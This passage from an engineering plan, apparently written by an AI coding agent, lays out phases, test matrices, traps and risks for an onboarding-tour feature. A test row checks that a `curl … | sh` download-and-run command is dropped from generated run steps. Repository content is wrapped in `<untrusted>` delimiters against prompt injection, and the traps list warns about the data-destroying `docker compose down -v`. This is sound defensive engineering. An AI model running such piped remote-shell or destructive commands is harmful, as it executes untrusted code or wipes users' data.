  - **B2.7** the rail — a real `<nav>` of real anchors in document order, reachable by Tab; a skeletonised or empty section renders greyed. **C20:** a fragment like `#first_tasks` against an empty state is ignored — no scroll, no error. Sections default open (`24-screen_tour_context.jsx:30`). → **A14**
- **Files:** `.../TourView/{TourView.tsx,helpers.ts,constants.ts,styles.ts,TourView.test.tsx}` · `.../TourView/_components/{SectionShell,ArchitectureSection,CriticalPathsSection,HowToRunSection,GuidedReadingSection,FirstTasksSection}/**` · `client/messages/en/onboarding.json`
- **Governing skill:** `frontend-ui-architecture`
- **Gate:** `cd client && pnpm exec vitest run --reporter=dot TourView 2>&1 | tail -n 30` · `pnpm typecheck` · `pnpm lint`
- **Done when:** **A14** (all five in the fixed order, one rail anchor per `kind`). **A21** (`diagram: null` → no container; `diagram: "flowchart LR\nA[[broken"` → nothing, no throw). **A23** (three fixtures, one per empty section, each rendering its named message and no empty card). **A26** (`skeleton_sections: ['how_to_run']` → the whitelist steps render **without** `why`, the marker is present, the other four sections render in full). **A9's client half** (a record with all five skeletonised renders every derived collection plus one top banner — asserted as *content present*, not as an error card). **C2**, **C3**, **C8** (six tasks wrap to two rows, ascending difficulty, partial final row left-aligned).
- **Depends on:** B1.
- **Commit:** `feat(tour): render the five sections, the rail, and the skeleton banner`

#### Phase B3 — Auditable, honest, and in-flight

- **What lands:** the difficulty basis beside every badge, dead paths struck through, the stale marker in the header, and the in-flight states.
- **Tasks:**
  - **B3.1** the difficulty basis inline — "Low · 1 caller · rank p31" — from `difficulty_basis`. **The client computes nothing**: `callers`, `rank_percentile` and `signal` are all persisted, which is what makes the label auditable and keeps one rubric in one place. `signal: 'no_index_signal'` renders its own phrasing, not "0 callers". → **A5** (rendered half)
  - **B3.2** a `resolved: false` entry renders **struck-through and non-interactive** — no `href`, no `onClick`, with the "no longer in the repo" note, and no *Open* control. Asserted as the **absence** of the handler, not the presence of a class: a styled-but-clickable link is the failure mode. → **A10**
  - **B3.3** the stale marker in the **header** beside "Generated from index of N files" (the `proposed` UX item, `:294-296`), naming the record's 7-character `indexed_sha`. The current sha comes from the **existing `useRepoIntelStatus`** hook that B1.4 already uses — **not** from A5.2's response fields (cross-model review C-3), which would make Track B depend on Track A after this plan declares it does not. **No mutation fires on render**, asserted on rerender. → **A11**
  - **B3.4** *Retry* on the skeleton banner sends `force: true`, **button only, never automatic on load** (Q9 default — an auto-retry on a page that renders useful content spends money on every visit to a repo whose model is misconfigured). → **A9**
  - **B3.5** in-flight (**C11**): *Generate* → *Generating…*, disabled; on a **re**generate the previous tour stays fully visible and *Regenerate* is disabled — no skeleton replaces a good tour for 60 s. A client-side timeout re-`GET`s rather than reporting an error, because the record is still being written server-side (spec `:312`).
  - **B3.6** (**C9**) commands render in a horizontally scrollable `<code>`; the **Copy control copies the full string** and is a labelled `<button>` announcing the copy, not the icon-only `<span>` the mock draws. Long paths middle-truncate with the full value in `title` and on copy.
  - **B3.7** (**Q3**) the critical-path *Open* control links to the file at the repo's host provider **at the record's `indexed_sha`**, `target="_blank"`.
- **Files:** `.../TourView/{TourView.tsx,helpers.ts,helpers.test.ts,TourView.test.tsx}` · `.../TourView/_components/{FirstTasksSection,CriticalPathsSection,HowToRunSection,GuidedReadingSection}/**` · `client/messages/en/onboarding.json`
- **Governing skill:** `frontend-ui-architecture`
- **Gate:** `cd client && pnpm exec vitest run --reporter=dot TourView 2>&1 | tail -n 30` · `pnpm typecheck` · `pnpm lint` · `pnpm build`
- **Done when:** **A10** (one unresolved path renders with no `href` and no `onClick`, note present). **A11** (differing sha → `shortSha` renders, **no** mutation on rerender). **C8**, **C9** (a 400-character command copies in full), **C11** (a pending regenerate keeps the old tour visible and disables the control), **C12**'s client half.
- **Depends on:** B2.
- **Commit:** `feat(tour): difficulty basis, dead-path marking, the stale marker and in-flight states`

---

### Synchronisation points

**One join, after A5 and B3 are both green.** Before it the tracks never touch a shared file — verify with `git diff --name-only` per track; the two lists must not intersect.

**`server/src/vendor/shared/**` is frozen after T1.** Any contract change discovered mid-track **stops both tracks**, is made server-side once, re-mirrored with `./scripts/check-shared.sh --fix`, and both resume. Two agents editing a contract in parallel is the failure `--fix`'s `--delete` makes unrecoverable (`INSIGHTS.md:337-353`). The related failure to watch at the join is `INSIGHTS.md:356-369`: a clause that both sides encode lands on one side and each side's tests assert its own half — here the clause is **R24's skeleton**, so the join's assertion goes where both halves meet: the it-test asserting the derived collections are non-empty on a thrown call (A9), plus the client test asserting the same fixture shape renders content.

#### Phase J1 — Join: verify the feature alone, end to end, and demonstrate the model path

- **What lands:** proof that the tour works as one system on a branch rebased on `main`, against a **real indexed repository** — not only as two independently green halves against fixtures.
- **Files:** `e2e/specs/13-onboarding-tour.flow.json` (new; `12-pr-brief.flow.json` is the highest existing)
- **Governing skill:** —
- **Gate, in this order:**
  1. `./scripts/check-shared.sh` — bare form, must report no drift.
  2. `cd server && pnpm typecheck && pnpm arch && pnpm test` — the unfiltered suite, **once**; it starts testcontainers for the 15 `*.it.test.ts` files. Docker is available on this machine, so this lane is executable rather than skipped.
  3. `cd client && pnpm typecheck && pnpm lint && pnpm test && pnpm build`
  4. `cd e2e && npm run e2e:hermetic` — **npm**, not pnpm.
  5. **Manual, non-optional (A27):** `./scripts/dev.sh`, import and index a **real** repository, generate, and confirm *Critical paths* and *Guided reading* are **non-empty**. `server/INSIGHTS.md:129-141` — the seeded `acme/payments-api` has no `clone_path`, is never cloned, and returns the degraded empty result from every facade read forever. Four of five sections are `repo-intel`-backed, so steps 2–4 being green is compatible with the feature never having produced one real chain.
  6. **Manual, same generation (A18):** read back `trace->>'budget_tokens'` and `trace->>'tokens_in'` by SQL and record the ratio. This is the first evidence in the repository of the pre-flight/billed ratio for a five-section schema; the 12 000 ceiling is reasoned, not measured (spec `:513-517`).
  7. **Integration checklist** (`INSIGHTS.md:395+`), on a branch rebased on `main`: (a) `tour` is in `server/src/modules/index.ts`'s registry; (b) `useTour`/`useGenerateTour` are exported from `client/src/lib/hooks/index.ts`; (c) every `onboarding.*` key the page reads exists in `client/messages/en/onboarding.json`; (d) `pnpm arch` reports exactly **10**; (e) the production build copies `src/prompts` → `dist/prompts`.

- **Demonstrating the default model (audit row 11) — two generations, not one:**
  - **Generation 1, on the registered default** `openrouter`/`deepseek/deepseek-v4-flash`, untouched. `OPENROUTER_API_KEY` is absent from `~/.devdigest/secrets.json` on this machine, so `container.llm('openrouter')` throws a `ConfigError` before any request. **This is the demonstration, not a blocker:** the page must return `200` with a full skeleton — tree, code-rendered diagram, chains with endpoints, rank-ordered reading list, whitelist run steps in fixed order, six candidates with computed difficulty — one top banner carrying `withFeatureProviderContext`'s actionable sentence ("…the Onboarding Tour model is set to openrouter/… — pick a model from a provider you have a key for, or add the key in Settings → API Keys"), `trace.budget_tokens` non-null and `trace.tokens_in`/`cost_usd` null. That is **A9 and C13 in production form**, and it is worth more than the fixture that asserts the same thing.
  - **Generation 2, on a workspace override.** In Settings → Feature Models set *Onboarding Tour* to `anthropic` with a model the machine has a key for. `provider` and `model` are R12 key components, so this is a natural cache miss and needs no `force`. This is the annotated path: A27's non-empty chains and reading, A18's ratio, and the first observation of whether the prose is any good.
  - **The registered default is not changed by this feature** (Q4, spec `:496`). Whether to add an OpenRouter key or repoint the default is a **CTO decision**; if generation 2 reads well and generation 1's skeleton reads as broken rather than useful, that is the evidence to bring.
- **Done when:** all seven steps pass; the e2e flow covers **A22** (a nav click reaches the tour, and `e2e/specs/06-onboarding.flow.json` is **still green** — `/onboarding` still renders the add-repository form), **A13** (the empty state) and **A14** (five sections, five anchors); generation 1 produces a **populated** skeleton with an actionable error; generation 2 produces a non-degraded tour with non-empty chains, a rendered diagram, and `dropped_refs`/`dropped_steps` recorded.
- **Depends on:** A5, B3.
- **Commit:** `test(tour): e2e flow 13, and the real-repo join`

#### Phase J2 — Insights

- **What lands:** the durable lessons, recorded where the next agent will find them.
- **Governing skill:** `engineering-insights`
- **Gate:** the skill's own quality bar — check a similar entry is not already there before writing.
- **Done when:** at minimum these are recorded or corrected: (a) `server/INSIGHTS.md` — the measured pre-flight/billed ratio from J1 step 6, the first data point for a five-section schema and the thing the 12 000 ceiling should be re-derived from, **explicitly next to the 2026-08-26 `BRIEF_BILLING_SAFETY_FACTOR` entry** so the two framings are visible together; (b) `server/INSIGHTS.md` — the `RepoIntel` facade passthrough is now the second sanctioned shape (beside `_shared/` + re-export) for a cross-module read, with three instances of the pattern pair; (c) `server/INSIGHTS.md` or root — a missing provider key surfaces as a `ConfigError` from `container.llm()` **before** any request, so any feature whose spec says "no key degrades" must catch it explicitly or ship a `5xx`; (d) root `INSIGHTS.md` / `CLAUDE.md` — the arch baseline is **10**, not 11, a correction `plans/10-pr-brief.plan.md` already made and which did not get folded back; (e) `client/INSIGHTS.md` — `activeKeyFor`'s substring chain is **order-dependent**, and a new route whose path contains an earlier entry's substring silently steals its key; (f) whether the skeleton read as useful or as broken to a human (spec `:532-535` records this as unestablished; J1 generation 1 is the first observation).
- **Depends on:** J1.
- **Commit:** `docs(insights): what the Onboarding Generator taught`

---

## AC → task → test → commit matrix

Every acceptance criterion in `specs/12-onboarding-generator.md:405-431`, the task that satisfies it, the test that proves it, and the commit it lands in. A task with no AC reference is a defect in this plan; a row with no task is an uncovered criterion.

| AC | Task | Test | Commit |
| --- | --- | --- | --- |
| **A1** cached record, no model call | A4.5, A4.6 | `server/test/tour.it.test.ts` — two `POST`s, LLM mock counter `=== 1` | `feat(tour): one grounded annotation call…` |
| **A2** only resolvable paths persist | A4.1 `groundPaths` | `tour-grounding.test.ts` — `src/does-not-exist.ts` absent, `dropped_refs === 1` | same |
| **A3** no non-whitelisted command persists | A2.4 (whitelist), A4.1 `filterSteps` | `tour-steps.test.ts` — `curl … \| sh` absent, `dropped_steps === 1`, logged | same |
| **A4** no unsupplied `candidate_id` persists | A4.1 `filterAnnotations` | `tour-tasks.test.ts` — `cand_zz` dropped, derived candidate still renders | same |
| **A5** difficulty from the rubric, model value discarded | A2.7 (rubric), A4.1 `applyDifficulty`, B3.1 (render) | `tour-difficulty.test.ts` — six `(C,P)` boundaries + `"high"` → `"low"`; `TourView.test.tsx` for the basis line | `feat(tour): derive the full skeleton…` + `…annotation call…` + `…difficulty basis…` |
| **A6** input measured as `system+user+schema` ≤ 12 000 | A3.1, A3.2, A3.7 | `tour-budget.test.ts` — injected counting tokenizer; measured string **contains** the serialized schema | `feat(tour): one budgeted, wrapped…` |
| **A7** over budget → no call, skeleton, `input_over_budget` | A3.3, A2.8, A4.3 | `tour-budget.test.ts` (refusal, 0 invocations) + `tour.it.test.ts` (persisted record's derived sections non-empty) | `…budgeted…` + `…annotation call…` |
| **A8** exactly one call, `maxRetries: 0` | A4.2 | `tour.it.test.ts` — invocation count `1`, `maxRetries` asserted on the argument | `feat(tour): one grounded annotation call…` |
| **A9** failure → `200`, populated skeleton, prose null | A2.8, A4.3, A4.4, B2.6, B3.4 | `tour-skeleton.test.ts` (derivation) + `tour.it.test.ts` (throwing LLM mock: every collection non-empty, every prose field null) + `TourView.test.tsx` (all-five fixture renders content) + **J1 generation 1** | `…skeleton…` + `…annotation call…` + `…skeleton banner…` |
| **A10** unresolved path non-interactive | A5.1, B3.2 | `tour-resolve.test.ts` + `TourView.test.tsx` — **absence** of `href`/`onClick`, note present | `feat(tour): re-resolve…` + `…dead-path marking…` |
| **A11** stale marker, no auto-regeneration | A5.2, B3.3 | `TourView.test.tsx` — `shortSha` renders, no mutation on rerender | `…dead-path marking, the stale marker…` |
| **A12** not-indexed → explanation + disabled Generate | A1.4, B1.4 | `tour.it.test.ts` (C1: zero rows, zero calls) + `TourView.test.tsx` (`status:'failed'`) + `e2e/specs/13-onboarding-tour.flow.json` | `feat(tour): GET/POST…` + `…non-populated states` + `test(tour): e2e flow 13…` |
| **A13** empty → CTA with token and time estimate | B1.2, B1.3, B1.7 | `TourView.test.tsx` (query `null` → CTA; query error → error branch) + e2e 13 | `…non-populated states` |
| **A14** five sections in fixed order, one anchor each | B2.1, B2.2, B2.7 (+ T4.1 removing the sixth) | `TourView.test.tsx` — DOM order, one anchor per `kind` + e2e 13 | `…rewrite the onboarding system prompt…` + `…render the five sections…` |
| **A15** everything repo-derived inside `<untrusted>` | A3.4, A3.5, T4.5 | `tour-prompt.test.ts` — delimiters, escaped `</untrusted>`, schema outside, SECURITY clause asserted **by its text** | `feat(tour): one budgeted, wrapped…` |
| **A16** no `.env`/`.env.local` value in the input | A2.4, A3.4 | `tour-prompt.test.ts` — `.env` sentinel absent **and** an `.env.example` *name* present | same |
| **A17** exactly one trace block, non-null on a skeleton | T1.2, T3.1, A4.3, A4.6 | `contracts.test.ts` (skeleton record parses) + `tour.it.test.ts` (column set on success and on the A7 refusal) | `feat(shared): TourRecord…` + `feat(tour): onboarding_tours…` + `…annotation call…` |
| **A18** `tokens_in` within 15 % of `budget_tokens`, else warn | A4.7 (helper) + **J1 step 6** (measurement) | `tour-grounding.test.ts` boundary cases + `log.warn` with both numbers; the ratio itself is manual and no test claims it | `…annotation call…` + `test(tour): e2e flow 13…` |
| **A19** 6th POST in a minute → `429` | A1.3 | `tour.it.test.ts` **on its own Fastify instance** | `feat(tour): GET/POST…` |
| **A20** no hardcoded user-facing string | B1.7, B2.*, B3.* | `TourView.test.tsx` under `NextIntlClientProvider` with a **rethrowing `onError`** | `…non-populated states` |
| **A21** `diagram` null or invalid → no container, no throw | A2.2, T4.2, B2.4 | `tour-derive.test.ts` (`diagram === null` strictly) + `TourView.test.tsx` (`null` and `"flowchart LR\nA[[broken"`) | `…skeleton…` + `…system prompt…` + `…render the five sections…` |
| **A22** nav entry, wizard intact, `activeKeyFor` repointed | B1.5, B1.6 | `helpers.test.ts` (both mappings) + e2e 13 (nav click reaches the tour) + `e2e/specs/06-onboarding.flow.json` still green | `feat(tour): the tour route, its nav row…` + `test(tour): e2e flow 13…` |
| **A23** empty derived set → named message, no empty card | A2.3, A2.4, A2.6, B2.5 | `tour-derive.test.ts` (`empty_reason` set) + `TourView.test.tsx` (three fixtures) | `…skeleton…` + `…render the five sections…` |
| **A24** reading list strictly rank-ordered, model order discarded | A2.5, A4.4 | `tour-reading-order.test.ts` — ranks `[0.9,0.5,0.2]`, response reversed; asserted on the success **and** skeleton paths | `…skeleton…` + `…annotation call…` |
| **A25** `kind` rejects anything outside the enum | T1.1, T1.4 | `contracts.test.ts` — `kind: 'not-a-section'` fails to parse | `feat(shared): TourRecord…` |
| **A26** one null section key → that section skeletonised only | A4.4, B2.6 | `tour-merge.test.ts` (`how_to_run: null` → only that kind in `skeleton_sections`) + `TourView.test.tsx` (steps render, marker present, four sections full) | `…annotation call…` + `…skeleton banner…` |
| **A27** generated correctly against a real indexed repo | **J1 step 5** (+ generation 2) | **manual** — non-empty chains and reading on an imported, indexed repo. No suite can substitute (`server/INSIGHTS.md:129-141`) | `test(tour): e2e flow 13…` |

---

## Verification matrix

| Command | Package | What it proves |
| --- | --- | --- |
| `./scripts/check-shared.sh` | root | The two `@devdigest/shared` trees are identical. They have drifted non-additively before (`INSIGHTS.md:337-353`); a drifted `TourRecord` means the client's own Zod rejects a valid server response. |
| `cd server && pnpm exec vitest run --reporter=dot --exclude '**/*.it.test.ts' test/contracts.test.ts` | server | **A25**, and that a skeleton record parses (**A17**). |
| `… test/repo-intel test/project-context` | server | T2 — the three facade reads work and degrade to `[]`; `project-context`'s suite green with no test edited. |
| `… test/tour-derive.test.ts test/tour-skeleton.test.ts` | server | **A9's derivation half**, **A21**, **A23**; C2, C3, C4, C6, C10. C6 uses a **throwing** `GitClient` subclass, not the base mock (`server/INSIGHTS.md:333-344`). |
| `… test/tour-difficulty.test.ts` | server | **A5** — six `(C,P)` boundaries and a model `"high"` overridden to `"low"`. |
| `… test/tour-reading-order.test.ts` | server | **A24** — rank order preserved against a reversed response, on both paths. |
| `… test/tour-budget.test.ts` | server | **A6** (ceiling holds; measured string **contains** the serialized schema) and **A7** (refusal at zero invocations), plus the drop order leaving P5/P7/P9/P10 intact. |
| `… test/tour-prompt.test.ts` | server | **A15** (wrappers, escaped delimiter, guard asserted by text) and **A16** (`.env` sentinel absent, `.env.example` name present). No `{{` survives rendering. |
| `… test/tour-grounding.test.ts test/tour-steps.test.ts test/tour-tasks.test.ts test/tour-merge.test.ts` | server | **A2**, **A3**, **A4**, **A26**, **A18's helper half**; C16, C17, C21, C22. |
| `… test/tour-resolve.test.ts` | server | **A10's server half**; C12, C19. |
| `cd server && pnpm exec vitest run --reporter=dot test/tour.it.test.ts` | server (**Docker**) | **A1** (counter `=== 1`), **A7**, **A8**, **A9** (throwing mock → populated skeleton), **A12** (C1: zero rows), **A17**, **A19** (own app instance); C7, C14, C15, C18. |
| **`assert completeStructured invocation count === 1 per generation`** (inside `tour.it.test.ts`, counting the `ContainerOverrides.llm` mock) | server | **Cost NFR — exactly one model call per generation, zero per view.** Not aspirational: a fixture returning malformed JSON must still show **one** invocation, and `maxRetries: 0` means no second. |
| **`assert tokenizer.count(sent + serializedSchema) <= 12_000` on the invocation actually made** | server | **Scale NFR — the single ceiling holds on every call made**, measured pre-flight and re-measured against what was sent. |
| `cd client && pnpm exec vitest run --reporter=dot TourView helpers` | client | **A10, A11, A12, A13, A14, A20, A21, A23, A26**, the `activeKeyFor` fix both directions, and C2, C3, C8, C9, C11, C20. |
| `cd server && pnpm arch` | server | The **10**-violation baseline holds. Specifically: `modules/tour/` imports no `modules/brief\|blast\|project-context\|repo-intel` file; `routes.ts` touches no `src/db/`; `derive/**`, `assemble.ts`, `grounding.ts`, `merge.ts`, `resolve.ts` touch no `src/db/` and no `src/adapters/`; `git`, `codeIndex` and `llm` are reached only through the container. **Never regenerate the baseline.** |
| `pnpm typecheck` | server, client | Both trees compile against the same contract, including the `kind` **and** `body` narrowings. |
| `cd server && pnpm db:generate` → `pnpm db:migrate` | server | Exactly one generated migration, no prompt, applies without touching existing rows, and the dead `onboarding` table is unchanged. |
| `cd server && pnpm test` (unfiltered) | server | **End-of-run only.** 42+ files, 15 on testcontainers, `testTimeout: 120_000`. Docker is available, so this lane runs rather than self-skipping. |
| `cd client && pnpm test && pnpm lint && pnpm build` | client | End-of-run. Lint at 0 errors / ≤ 43 baseline warnings — green means "nothing new". `build` proves the new route compiles under the Next production build. |
| `cd e2e && npm run e2e:hermetic` | e2e (**npm**) | **A22** — the nav click reaches the tour **and** flow `06` still renders the add-repository form. Plus **A13**, **A14** as browser flows. |
| `./scripts/dev.sh` + two generations on a real imported, indexed repo | manual | **A27** and **A9-in-production** (generation 1, default provider, no key → populated skeleton) and **A18's measurement** (generation 2, `anthropic` override, ratio read by SQL). The seed cannot produce either (`server/INSIGHTS.md:129-141`). |

---

## Traps for this change

- **`server/clones/**` holds a full copy of this repository**, including copies of every file this plan edits. Exclude it from every grep and glob or you will read and change the wrong `service.ts`.
- **The `repoIntel` facade does not expose what R2/R3/R6/R10/R11 need** (audit row 1). `getEdges`, `getRankedPaths` and `getFileFacts` are on `repo-intel`'s **repository**, and `no-cross-module-internals` counts `import type` (`tsPreCompilationDeps: true`). Phase T2 is the only legal door.
- **`modules/blast` is the wrong door for R9.** PR-scoped (`blast/service.ts:27`), deliberately (`specs/08-blast-radius.md:56-59`), and importing it trips the same rule. Use `container.repoIntel.getBlastRadius(repoId, files)`.
- **`modules/brief/grounding.ts` cannot be imported.** This module gets its own, and it is a different shape anyway.
- **The skeleton is not the empty state and not an error page** (spec Trap 2, `:442-445`). R24 renders *content*. The tempting shortcut — return early on a call failure and let the existing error card handle it — deletes the whole point of this revision, and no test asserting only `degraded: true` catches it. A9's *Done when* asserts the derived collections are **non-empty**.
- **`getCriticalPaths` is not a UI-to-DB trace** (spec Trap 4). It greedily follows the highest-ranked import target from the top 5 ranked files, two hops, over a JS/TS-only index that knows nothing about SQL, HTTP clients or layers. Honest as "the chains most of the code depends on"; a lie as "how a request reaches the database". The **section title given to the model** is where this goes wrong, which is why T4 fixes the template before any track starts.
- **The seeded demo repo cannot exercise `repo-intel` at all.** Four of five sections are `repo-intel`-backed. A green `pnpm test` plus a green e2e flow proves the *degraded* path only. J1 step 5 is not optional.
- **A missing provider key throws before the call is made.** `container.llm('openrouter')` raises a `ConfigError`; `withFeatureProviderContext` re-throws it with better text. Let it propagate and R17's "never `5xx`" is broken on the very configuration this machine has. Catch it in A4.3.
- **`SimpleGitClient.readFile` throws ENOENT** (`simple-git.ts:128-130`) and has **no traversal guard**, while `MockGitClient.readFile` returns `''` and never throws (`server/INSIGHTS.md:333-344`). Every config read is individually caught, and any C6 / `clone_unavailable` test uses a throwing subclass or it asserts the wrong branch and still passes.
- **`JSON.stringify` of a Zod schema is not a JSON schema.** R14's addend is `toJsonSchema(schema, name).schema` from `@devdigest/reviewer-core` via `platform/structured.ts:6-12` — the object the adapter actually sends.
- **The pre-flight counter is a floor, not the billed number**, and counting the schema closes only about a third of the gap (`server/INSIGHTS.md:304-318`). The 12 000 ceiling carries **no** safety factor by Q8's default. Say so in the constant's doc comment or it becomes folklore as a billed ceiling.
- **`renderTemplate` leaves unknown `{{placeholders}}` intact.** `onboarding.system.md:42` carries `{{language}}`; omit it and the literal string goes to the model.
- **`onboarding.system.md` is half-right and half-wrong.** It names `routes_and_apis` (`:8,23-26`) and invites the model to author the diagram (`:27`). Treating it as finished reintroduces a section nobody asked for and a diagram nobody grounded. Its real line numbers differ from the spec's citations (audit row 4) — it was not replaced.
- **The `onboarding` table cannot hold the cache key** — one row per repo, no key columns. Persisting into it silently discards R12 and the tour never goes stale. New table.
- **Migrations are generated, never written.** Edit `server/src/db/schema/context.ts`, run `pnpm db:generate`. Add-only on a new table is one clean pass; the two-generate rule applies only when one table both adds and drops columns.
- **`text('col', { enum })` in Drizzle is TypeScript-only** — no PG constraint, and nothing enforces that the column's list and the Zod enum agree. R19's narrowing is an application claim; **A25 is what makes it real.**
- **`client/messages/en/onboarding.json` describes a different feature** (`:10`) and carries a bare `{count}` (`:4`). Shipping against those strings promises the wrong five sections.
- **`client/src/vendor/ui/nav.ts` is vendored** and `CLAUDE.md` says do not touch it. B1.5 is the plan's **one deliberate exception**, precedented (`client/INSIGHTS.md:162-174`), isolated to one phase, landing **with** the page (`nav.ts:33-35` — an entry before its screen exists is a nav item that 404s).
- **`activeKeyFor` currently maps `/onboarding` → `"onboarding-tour"`** (`helpers.ts:29`), and the chain is **order-dependent**. Adding the nav row without removing that line makes the add-repository wizard highlight the tour. Both edits are B1.6, in the same commit as the nav row.
- **`/onboarding` is the add-repository wizard** (`client/src/app/onboarding/page.tsx`, mock 15, `e2e/specs/06-onboarding.flow.json`). Wiring the tour there replaces a shipped screen.
- **Not a monorepo.** `server/` and `client/` are **pnpm**; `e2e/`, `reviewer-core/` and `mcp/` are **npm**. J1 step 4 is the npm one.
- **Two gates are baselined:** `pnpm arch` ignores **10** known violations (not the 11 `CLAUDE.md` states), and `client pnpm lint` exits 0 with 43 pre-existing warnings. Green means "nothing new". Never regenerate the baseline; never `lint --fix` as part of this feature.
- **Never `docker compose down -v`** to reset the test database — `-v` destroys `devdigest_pgdata` and every imported repo and review with it.
- **No transactions exist anywhere in the server.** Generation is a single upsert, so nothing here needs a boundary — but do not add a second write to that path without moving the boundary into the service.
- **CI is path-filtered** — five workflows, each scoped to its own paths. A change outside a filter is checked by nothing. The gates in this plan are the gates that matter.
- **A feature can ship inert.** `modules/index.ts`, `hooks/index.ts`, the message keys and the `src/prompts` → `dist/prompts` copy are the four lines that merge cleanly and leave nothing working. J1 step 7 exists only for this.

---

## Risks and unknowns

- **The five section payloads are frozen at T1 and both tracks build against them.** If Track A discovers that `tree[].role_mix` needs structure, or `paths[].endpoints` a method as well as a route, both tracks stop, the contract changes server-side once, `--fix` re-mirrors, both resume. Mitigation: T1 lands the field list at full fidelity from the spec (`:330-337`), not incrementally.
- **The 12 000 ceiling is reasoned from the merge arithmetic, not measured** (spec `:513-517`), and by Q8 carries no billing safety factor while the brief's shipped equivalent carries `× 2`. If the real ratio for this schema resembles the brief's, the ceiling is a floor with no headroom and `input_over_budget` becomes the common path on any repo of size. **Nothing in the plan changes** — the constant lives in `modules/tour/constants.ts`, so retuning is one edit, and J1 step 6 is the measurement that decides.
- **`deepseek/deepseek-v4-flash` has never been called by any code path**, and on this machine it **cannot** be (audit row 11). With `maxRetries: 0`, a malformed structured response is a permanent skeleton. J1 generation 2 on an `anthropic` override tells us whether the *schema* is answerable; it does **not** tell us whether the default model can answer it. That question stays open until someone adds an OpenRouter key. If the answer turns out to be no, the fix is a `FEATURE_MODELS` default change plus its client mirror — one line each — and it is a **CTO decision**, not the implementer's.
- **`getCriticalPaths` on a real repository is unmeasured** (spec `:518-522`). It may return five near-identical chains through the same hub file; its only dedup is on the whole joined chain key (`service.ts:704-706`), which does not catch "five chains sharing a tail". **~30 minutes to check at J1 step 5.** If it reads badly, R3 needs a chain-deduplication rule — a spec revision, not a plan repair.
- **The distribution of first-task candidates is unmeasured** (spec `:523-527`). A repo with 400 TODOs and one with none are both handled (the 12 cap and C7); which is typical decides whether the section is useful or noise.
- **`container.codeIndex.grep`'s pure-Node fallback may be too slow** on a 12 450-file repo for the 10 s derivation budget (spec `:528-531`); `@vscode/ripgrep` is an optional runtime dependency. **~20 minutes to check in A2.** If it is too slow, the `todo_marker` generator gets its own timeout and yields zero on expiry — already its documented failure mode, so the fix is a constant, not a redesign.
- **Whether a skeleton reads as useful or as broken to a real newcomer is a design judgement with no precedent in this product** (spec `:532-535`). J1 generation 1 is the first observation, and it is deliberately the *default* configuration, which is the worst realistic case. Recorded at J2 either way.
- **Unknown, ~10 minutes to check in T1:** whether narrowing `OnboardingSection.kind` **and** `body` breaks any client fixture. It should not — the shape has zero consumers — but `INSIGHTS.md:370-381` records exactly this class of change breaking test files in modules the task never touched. `pnpm typecheck` in both trees answers it by name.
- **Unknown, ~10 minutes to check in T4:** whether the production build copies `src/prompts` → `dist/prompts`. A missing copy step is a production-only failure no test catches.
- **`file_facts.endpoints` population is assumed, not verified.** The column exists with a `[]` default and `modules/blast` reads it, but I did not confirm the indexer populates it for a real repo. If it is empty in practice, R3's endpoint annotation and R8's `undocumented_endpoint` generator both silently yield nothing — a quiet degradation, not a failure. Checked at J1 step 5.
- **R11 adds a `getIndexedFiles` call to every `GET`.** One indexed query plus a set pass should sit inside the 400 ms warm bound, but it is not measured. If it does not, the fallback is caching the path set per `(repoId, indexed_sha)` in process — no contract change, no migration.

---

## Recommendations

Not in the plan above. Each changes what gets built, which is the spec's business and a human's call.

- **Reconcile Q8 with `server/INSIGHTS.md:304-318` explicitly, or drop the pretence that 12 000 is a ceiling.** The insight recorded on the same day as the spec says a gate that counts the schema and stops is *"still unsound, just less so"*, and what actually shipped for the brief is `envelope × BRIEF_BILLING_SAFETY_FACTOR = 2`. Q8's default ships the shape the insight names as insufficient, on a **larger** schema. Two honest options: (a) keep the raw count and rename the constant to say *floor*, which is what this plan does; (b) import the factor and halve the effective input budget, which changes the drop order's practical behaviour on every real repo. Cost to change now: one clause in R14. Cost later: an implementer defends a 12 000 "ceiling" that bills ~24 000, and the first over-budget refusal happens at a repo size nobody predicted.
- **Fix the `onboarding.system.md` line citations in R16, R2/C10 and the i18n NFR.** The file is 44 lines: SECURITY is `:11-12` (spec says `:9-11`), mermaid rules `:29-36` (spec says `:31-34`), do-not-translate `:42-44` (spec says `:45-47`). Cost now: three numbers. Cost later: an implementer concludes the file was replaced and rewrites it, losing the SECURITY paragraph R16 depends on.
- **Add `{{language}}` to the Provenance table, or remove it from the template.** `renderTemplate` leaves an unsupplied placeholder intact, so the omission ships the literal `{{language}}` to the model. It is one row in P1 or one line deleted from `onboarding.system.md:42`; either is fine, silence is not.
- **State in R17 that a missing provider key is a caught `ConfigError`, not a returned error object.** R17 lists "no provider key" first among the degrading failures, but the mechanism (`container.llm()` throws before any request; `withFeatureProviderContext` re-throws) means a naïve implementation returns `500` on exactly the configuration this machine has. One clause turns the most likely first-run bug into a task.
- **Decide Q4 with evidence rather than by default, using J1 generation 1.** The spec's default is "keep it and ship, because R24 makes the failure survivable". That is defensible — but on this machine the default provider has **no key**, so the out-of-the-box experience is a skeleton with a Settings link, on every repo, forever. That is not the same risk the spec weighed. Either add `OPENROUTER_API_KEY`, or repoint the default to a provider the deployment has a key for, or accept the skeleton-by-default deliberately and say so in the spec. Cost now: one line in `FEATURE_MODELS` plus its client mirror. Cost later: the feature's first impression is its degraded path.
- **Name the `repoIntel` facade extension in the spec, or acknowledge it as a planner's call.** The module-interaction table (`:313`) lists six facade methods as if they cover R2, R3, R10 and R11; three of the four inputs those requirements need are not on the facade at all. As written, an implementer discovers this at the first `pnpm arch` failure and reaches for `repo-intel/repository.ts`. One sentence turns a trap into a task. (Spec 11 had the same gap; it survived the revision.)
- **Reconsider R3 given that `getCriticalPaths` may be near-degenerate.** Its dedup is on the whole chain key, so five roots importing the same hub produce five chains sharing a tail. If J1 step 5 shows that, the honest fix is a chain-deduplication rule at the service level — a spec change, cheapest decided after the first real generation.
- **Reconsider A18's 15 % tolerance in favour of "log both numbers, always".** As written it is a threshold chosen before the first data point on a ratio nobody has measured for this schema, and its only real verification is manual. "Persist both and warn when the ratio moves more than X from the last recorded value" would be checkable.
- **Two `INSIGHTS.md`/`CLAUDE.md` corrections are overdue** and would have misled this session had I not checked the disk: the arch baseline is **10**, not the 11 `CLAUDE.md` states (a correction `plans/10-pr-brief.plan.md` already made and which was never folded back), and `client/INSIGHTS.md:176-187`'s "`NAV` is vendored and off-limits" is superseded by `:162-174` but still reads as current to anyone who greps for `nav.ts`. Recorded as J2 work.

---

## Out of scope for the implementer

- **Architecture review** — a separate agent. `pnpm arch` is the mechanical half; the per-phase placement decisions are the reviewable half.
